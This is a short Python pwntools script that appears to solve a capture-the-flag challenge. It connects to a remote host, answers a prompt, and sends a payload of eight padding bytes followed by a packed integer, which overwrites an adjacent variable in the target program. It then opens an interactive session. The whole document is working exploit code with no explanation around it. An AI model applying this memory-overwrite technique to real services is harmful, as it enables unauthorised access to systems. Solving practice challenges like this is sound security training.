from pwn import *

t = remote('111.198.29.45', 30846)
t.sendlineafter('Your Birth?', '1234')
payload = 'a' * 8 + p64(0x786)
t.sendlineafter('Your Name?', payload)
t.interactive()